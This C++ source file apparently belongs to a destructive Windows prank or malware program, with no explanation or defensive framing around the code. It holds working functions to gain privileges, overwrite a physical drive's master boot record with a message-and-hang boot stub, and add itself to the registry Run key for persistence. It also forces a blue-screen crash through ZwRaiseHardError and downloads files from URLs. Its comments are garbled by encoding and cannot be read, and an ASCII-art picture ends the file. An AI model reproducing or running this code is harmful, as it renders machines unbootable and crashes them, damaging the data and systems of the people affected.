#include"std.h"


using namespace std;

bool GetPrivileges()
{
	HMODULE ntdll = LoadLibrary(_T("ntdll.dll"));//����ntdll	
	if (ntdll == NULL)
		return false;
	FARPROC RtlAdjPriv=GetProcAddress(ntdll,"RtlAdjustPrivilege");//��ȡ��Ȩ����	
	BOOLEAN ErrKill;
	bool retn = false;
	retn=((UINT32(*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))RtlAdjPriv)(0x13, TRUE, FALSE, &ErrKill)<0xc0000000;//����RtlAdjustPrivliege������ȡSeShutdownPrivilegeȨ��
	FreeLibrary(ntdll);
	return retn;
}

//дMBR
bool WritePhydriveMBR(unsigned int id,const string& msgstr)
{
//	#pragma warning(push)
//	#pragma warning(disable:4309 4838)
	static BYTE pMBR[512] = { 0xB8,0x11,0x00,0xCD,0x10,0xBD,0x18,0x7C,0xB9,/*�ַ�λ��*/0x00,0x00,0xB8,0x01,0x13,0xBB,0x0C,0x00,0xBA,0x00,0x00,0xCD,0x10,0xEB,0xFE };
//	#pragma warning(pop)
	static bool isfirstuse = true;
	bool retn=true;
	if (isfirstuse)
	{
		//��ʼ��MBR
		
		//��MBR���ַ�λ��
		pMBR[9] = static_cast<BYTE>(msgstr.size());
		//��ѭ���߼����������������ã�������Win9x����Ч��������
		//pMBR[0x1BF] = 0x00;
		//pMBR[0x1C2] = 0x05;
		//�ӽ�β
		pMBR[510] = static_cast<BYTE>(0x55);
		pMBR[511] = static_cast<BYTE>(0xAA);
		//����ʾ�ַ�д��MBR
		retn = strcpy_s(reinterpret_cast<char*>(pMBR + 24), 512, msgstr.c_str()) && retn;
		isfirstuse = false;
	}

	//����Ӳ���ļ�����
	wstringstream wss;
	wss << _T("\\\\.\\PHYSICALDRIVE") << id << flush;
	//��
	HANDLE hFile;
	hFile = CreateFile(wss.str().c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	//��readfile����ȡMBR
	retn = WriteFile(hFile, pMBR, 512, NULL, NULL) == TRUE;
	CloseHandle(hFile);
	return retn;
}

//��MBR
string ReadPhydriveMBR(unsigned int id)
{
	
	char pMBR[512] = {};
	wstringstream wss;
	//����Ӳ���ļ�����
	wss << _T("\\\\.\\PHYSICALDRIVE") << id << flush;
	//��
	HANDLE hFile;
	hFile = CreateFile(wss.str().c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	//��readfile����ȡMBR
	DWORD dwReadSize;
	
	bool r_flag = ReadFile(hFile, pMBR, 512, &dwReadSize, NULL) == TRUE;
	CloseHandle(hFile);
	if (r_flag)
		return static_cast<string>(pMBR);
	else
		return static_cast<string>("");
}


//ע��������
bool RegAutoStart(const wstring& name)
{
	HKEY hKey;
	const TCHAR *strRegPath = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	//1���ҵ�ϵͳ��������  
	if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) ///��������       
	{
		//2���õ������������ȫ·��
		TCHAR strExeFullDir[MAX_PATH];
		GetModuleFileName(NULL, strExeFullDir, MAX_PATH);
		//3���ж�ע������Ƿ��Ѿ�����
		TCHAR strDir[MAX_PATH] = {};
		DWORD nLength = MAX_PATH;
		//4���Ѿ�����
		if (RegGetValue(hKey, nullptr, name.c_str(), RRF_RT_REG_SZ, 0, strDir, &nLength) != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0)
		{
			bool retn = false;
			//5�����һ����Key,������ֵ
			retn=RegSetValueEx(hKey, name.c_str(), 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1) * sizeof(TCHAR)) == ERROR_SUCCESS;
			//6���ر�ע���
			RegCloseKey(hKey);
			return retn;
		}
		else
			return true;
	}
	return false;
}

//��������
bool MakeBlueScreen(unsigned int errid)
{
	HMODULE ntdll = LoadLibrary(_T("ntdll.dll"));
	if (ntdll != NULL)
	{
		FARPROC RtlAdjPriv = GetProcAddress(ntdll, "RtlAdjustPrivilege");
		FARPROC RtlSetProcessIsCritical = GetProcAddress(ntdll, "RtlSetProcessIsCritical");
		FARPROC ZwRaiseHardErr = GetProcAddress(ntdll, "ZwRaiseHardError");//��ȡ��������
		unsigned char ErrKill;
		long unsigned int HDErr;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13, true, false, &ErrKill);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZwRaiseHardErr)(errid, 0, 0, 0, 6, &HDErr);
		FreeLibrary(ntdll);
	}
	return false;
}

//��������
bool PlaySoundFile(const wstring& soundname,bool sync)
{
	return PlaySound(soundname.c_str(), NULL, SND_FILENAME | SND_NODEFAULT | (sync ? SND_SYNC : SND_ASYNC) | SND_LOOP) == TRUE;
}

bool DownloadFileFromURL(const std::wstring& url, const std::wstring& filepath)
{
	return ((URLDownloadToFile(NULL, url.c_str(), filepath.c_str(), 0, NULL)) == S_OK);
}


//��URL��ȡ�ַ���
std::wstring GetDataFromURL(const std::wstring& url, bool& isok)
{
	CInternetSession session;
	CHttpFile* file = NULL;
	CString strURL = url.c_str();//URL
	CString strHtml = _T("");	//�����ҳ����
	try
	{
		file = (CHttpFile*)session.OpenURL(strURL);
	}
	catch (CInternetException* m_pException)
	{
		file = NULL;
		m_pException->m_dwError;
		m_pException->Delete();
		session.Close();
		isok = false;
		return std::wstring();
	}

	CString strLine;

	if (file != NULL)
	{
		while (file->ReadString(strLine) != NULL)
		{
			strHtml += strLine;
		}
	}
	else
	{
		return std::wstring();
	}
	session.Close();
	file->Close();
	delete file;
	file = NULL;
	isok = true;
	return std::wstring(strHtml);
}

/*
������
���򰲿�
�ڴ治���
+------------------------------------------------------------------------------------------------------------------------------------------------------+
|srssr  ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, , ,												   |
|sirsrr,																						   													   |
|srssss2s:  ,,,,,,,,,,,,,,,,,,,, ,,,,,,, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, ,													   |
|srssssrssr,  ,,,,,,,,,,,,, , , ,,, ,,, ,,, , ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, ,,,,,,,,,,, ,,, , ,													   |
|srsrsrsrsssi,  ,,,,,,,,,, , ,,, , , , ,,, , ,,, , , ,,,,,,,,, , , ,,, , , ,,, ,,,,, ,,,,,,, , , ,													   |
|srssrrrrrrrssr,  ,,,,,,, , , , ,,, , , , , , ,,, ,,,,, , ,,,,,,,,,,, , , , ,,,,, , , ,,, , ,,,														   |
|srsrrrrrrrrrrssi,   , , , , , , , , , , , ,,, ,,, , , ,,, ,,,,, , , , , ,,,,,,, ,,, ,,, , , , ,													   |
|srssrsrrrrrrrrrssi    ,, , , , ,,, , , , , ,,, , , ,,, , , , ,,,,,,,,,,,,,,,,, , , , , , , , ,														   |
|::sssrrrrrrrrrrrrss:   ,, , , , , , , , , ,,,,, , , ,,, , , , , , , , ,,,,, , , , , , , , , , ,													   |
|,,:rssrrrrrrrrrrrrrss: , ,,, ,,, , , , , , , , , , ,,,,, ,           , , ,,, , , , ,,, , , , ,														   |
|:,:,:rsrrrrrrrririrrsr  , , , , , , , , , , , , , ,,, ,         ,:i:, ,,,,,,, , , , ,,, , , , ,													   |
|:,::,,:rrrrrrrirrrirrr   , , , , , , , , ,,,,,,, , ,,,   ,rs2G99MBBhi  , , , ,,, , , , , ,,, , ,													   |
|:,:::,,,:rsrrrrirrrisr  , , , , , , ,,, , , , , ,,, , , ,sMMMMGG9MBGs,  , ,,, , , , ,,,,, , ,,,													   |
|:,::::,:,,:rsrrrrrirrr   , , , ,,, , , , , , ,,, , ,,,,, isMM2:,isGBGr , , ,,,,, , , , , ,,,,, , ,													   |
|:,:::,:,,,,,:rsrrrrisr  , , , ,,, ,,,,, , , ,,, , , , ,    r2,:,i,:9:   ,,, , ,,,,,,, , , , , ,													   |
|:,::,:,:,:,,,,:rrrirrr , , , , , , , , , ,,, , , ,,, ,,,    :,,r: ,:       , ,,,,, , ,,, , , , ,													   |
|:,:::,:,:,,,,,,,irrrsr  , , , , , ,,, , , ,,, , ,,, , , ,    ,:,,,GBGhr       , , ,,, , ,,, , ,													   |
|:,::,:,:,,,:,,,,,,:rsr   , , , , ,,,,,,, ,,, ,,, , ,,,      iBMssBBMMBB r2     ,,, , ,,, , , , ,													   |
|, :::::,,,:,,,,,,,,,rr  , ,,, , , , , , , , ,,,,, ,,,    sB,sBBBBBGGBBB XBB9r   , , , ,,, , , , , ,												   |
|, ,,::::,,,,,,,,,,,,,:   , , , , , , ,,, , ,,, , ,,,   ,BBBX BBMGGGMMBM sBMBBh   ,,, ,,,,, , , ,													   |
|, , ,,:::,,,,,:,,,,,,,:,,   , , , , ,,, , , , ,,, ,   :BBMBB,XMGMMMGMBB sBMMBBs   , , ,,, , , , ,													   |
|, ,,,  ,::,,,,,,,,,,,,,::,,  , ,,,,, , , ,,, , , ,    BBMBBB,sBBMMMMMBB,rBMMMBB   ,,,,,, , , , , , ,												   |
|, ,,,,, ,,:::,:,,,,,,,,,:::,, , , , ,,, ,,,,, ,      XBMBBMBX,BBMMMMMMBr,BBMMMBs    ,,,,,,, , , , , ,                                               , |
|, ,,,,,,   ,::,:,:,,,,,,,,,::,,  , ,,,,, ,,,       ,MBBBBs GBrhBMMMMMMB9 BBBMBBBs    , ,,, , , , , ,                                               ,, |
|, ,,,,,,,,  ,,:::,,,,,,,,,,,:::,, , ,,, ,,,     ,GBBBBBBi   GBsBBMMMMMBB 2BBBBBBBM  , ,,,,, , ,,, , , ,   ,                           , ,     , , , , |
|, ,,,,,, ,,,   ,,:,,,:,,,,,:,:,::,   ,,, ,    :5BBBBBGs        :GBBBBBBBrsBB9,BBBBs  , , ,,, , , ,,,,, , ,   ,     ,   ,       , , , , , , ,,, , , ,, |
|, ,,,,,,, ,,,   ,,:,:,,,,,,,,,,,:::,  ,,,  ,rMBBBMSi      ,     :G99G9SX9S5h9 sBBBB,  , , , , , , , , , , , , , , , , , , , , , , ,,,,,,,,, ,,,,,,,,, |
|, ,,,,,,,,,,,,,,   ,::,,,,,,,,,,,:::,,     ,9BM9:      ,,,,,  r9S2sssss25Ss2Ms  sBBG   , ,,,,, ,,, ,,, ,,, ,,,,, ,,,,, ,,, , , , ,,,,,,,,,,,,,,,,,,,, |
|, ,,,,,,,,,,, ,,,   ,,:,:,:,,,,,,,:,:::,  ,:,i:,:::   ,,, ,   sG5s2sss222sss92   iBB5   ,,, ,,,,, , , , , ,,,,, , , , , , ,,,,,,,,,,,,,,,,,,,,,,,,,,, |
|, ,,,,,,,,,,,,,, ,,,  ,:::,,,,,,,,,:,:,:,,,rr:::iss2,  ,,,  ,r2sssssssssrrirsi    :BBi   ,,,,,,, , , , ,,,,,,,,, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,|
|, ,,,,,,,,,,,,,,,,,,,   ,,:,:,,,,,,,,,,,:,iisirrrrr22  ,,  r5sssssss2SSsriii2,    :BBs  ,,,,, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, |
|, ,,,,,,,,,,,, ,,,,,,, ,  ,:::,:,,,,,:,:,,i2ssssssshs, ,  iXsssss29Mhr2Sriirs, ,   r,:,, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,|
|, ,,,,,,,,,,,,,,,,,,,,, ,   ,::::,:,,,,,,,,r9h522Shs,    ,2s2sss5GMi   rriirs  ,, ,, ir ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, |
|, ,,,,,,,,,,,, ,,,,,,,,, , ,  ,:::,:,,,,,,,,:ss2ss:,     sssss29Mh     :rrisr  ,,,,  r, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,|
|, ,,,,,,,,,,,,, ,,,,,,,,,,,,,   ,::::,:,,,:,,,,,,,,     rsss25MMr   ,  :siirs  ,,,, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, |
|, ,,,,,,,,,,,,,, , ,,,,,,,,,,,,, ,,:::,:,:,,,,,,,,,:,, :sss2XGs    ,,, s2sss2i ,,,,, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,|
|, ,,,,,,,,,,,,, ,,,,,,,,,,,,,,,,,   ,::::,:,:,,,,,:,:,:22s2s92    , ,, ,S22s22  ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:,|
|, ,,,,,,,,,,,,,,,,,,,, ,,, ,,,,,,,,, ,,:::::,:,:,,,:,,:99559Gs   ,,,,,  ihsss5,  ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,|
|, ,,,,,,,,,,,,,,,,,,, , , ,,,,,,,,,,, , ,::::,:,:,:,:,,:299hXhS,  ,,,,,  2sss2, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:,|
|, ,,,, , ,     ,   , ,     ,   ,          ,:,,,,,,,:,,,, i2h22h9,    ,   ss2s5,    , , ,   , , , , , , ,,, , , , , ,,, , ,,, ,,,,, ,,,,,,,,,,,,,,,,,,,|
|i,:::::::::::,:,,,,,:,,,:,:,,,,,,,,,,,,,,,,,:::::::::::::,,s92Shh, ,,,,, rSs22, ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:,|
|i:ii:i:::::::::::::::::::::::::::i:i:::i:i:i:i:i:::i:::i::,,s92Xh9i,,:::,22s22,::::i:i:::i:i:::i:::::::i:::::::::::i:i:::i:i:i:i:i:::i:i:iiiiiiiiririi|
|i,i::::::::::::::::::::::::::::::::::::::::::::::::::::::,:,,2G9952,r,,,iSssSs,,:::::::::,:::::::::::::::::,::::::::::::::::::::::::::::::i:i:::iiiir:|
|:,::::::::::::,:,:,:,:,:,:,:,:,:,:,:,:,,,:,:,:,:,,,:,:,:,:,:,,sr:MGBB: ,i2ssss ,,:,:,:,:,:::,:,:,:,:,:,:,:,:,:::::::,:::::,::::::::::::::::::::::::ii:|
|:,:::::,:::,:,:,:,:::,:,:,:,:,,,:,:,:,:,:,:,:,:::::,:,:,,,,,,   ,BBBBBi ,,:2Gs ,,,:,:,:,:,:,:,:,:,:::,:,:,:,:,:,:::::,:::::,:,:,::::::::::::::::::i:i,|
|:,::::,:,:,:::,,,:::,:,:,:,:,:::,:::,:,:::,:,:,:,:::,:,:,:,  ,,sBBBBBBB:  iBBG ,,:,:::::::::,:,:,:,:,:,:,:,:,:::,:,:,:,:,:,,,,,,,:,::::::::::::::::ii:|
|:,:::,:,:,:,,,:,:,:,,,:,,,,,,,:,:,,,,,:,:,:,:,,,:,:,,,:,:,,sBBBBBBBMBMG:, sMGG ,:,:::,:,:::::,:,:,:,:,:,:,:,:,:,:,:,:,:,:,,,:,:::,:,::::::::::::::i:i,|
|:,::::::,:::,:,:,:,:,:,:,:,:,:,:,:,:,:::,:::,:::,:,:,:::,:,s99hhsi,,,, ,, sM99,,,:,:::,:,:,:,:,,,:,:,,,:,:,:,,,,,:,:,,,:,:,:,:,:,::::::::::::::::::i::|
|: ,,,,,,,,,,,,,,,,,,,,, ,,, ,,, ,,,,, , ,,,,,,,,, ,,,,,,,,,       ,,,,,,, sSS9: ,,,,,,,,,,,,, , ,,, , , ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:,|
+------------------------------------------------------------------------------------------------------------------------------------------------------+
*/